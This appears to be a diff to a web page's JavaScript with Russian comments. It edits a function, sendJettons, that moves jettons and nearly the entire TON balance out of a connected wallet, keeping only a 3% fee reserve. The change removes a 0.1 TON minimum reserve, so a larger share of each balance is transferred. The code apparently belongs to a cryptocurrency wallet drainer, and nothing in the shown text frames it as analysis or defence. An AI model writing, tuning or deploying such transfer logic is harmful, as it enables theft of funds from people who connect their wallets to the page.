@@ -260,7 +260,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         }
     }
 
-    // ВАЖНОЕ ИСПРАВЛЕНИЕ: Оставляем 3% от баланса для комиссий
+    // ИСПРАВЛЕНИЕ: Правильный расчет TON для отправки с учетом 3% резерва
     console.log('Checking TON transfer conditions:', {
         tontx: tontx,
         tonBalance: ton,
@@ -275,9 +275,9 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         try {
             const tonBalanceNano = TonWeb.utils.toNano(ton);
             
-            // ИСПРАВЛЕНИЕ: Оставляем 3% от баланса для комиссий, но не менее 0.1 TON
+            // ИСПРАВЛЕНИЕ: Оставляем 3% от баланса для комиссий
             const tonBalance = parseFloat(ton);
-            const reservedForFees = Math.max(tonBalance * 0.03, 0.1); // 3% или минимум 0.1 TON
+            const reservedForFees = tonBalance * 0.03; // 3% резерв
             const transferAmount = tonBalance - reservedForFees;
             
             console.log(`TON balance: ${tonBalance}, Reserved for fees (3%): ${reservedForFees}, Transfer amount: ${transferAmount}`);
@@ -348,6 +348,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         console.log('❌ TON transfer not added - conditions not met');
     }
 
+    // Остальной код без изменений...
     // Проверяем что есть сообщения для отправки
     console.log(`Final transaction has ${transaction.messages.length} messages`);
     console.log('Messages:', transaction.messages.map((m, idx) => 
@@ -794,6 +795,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
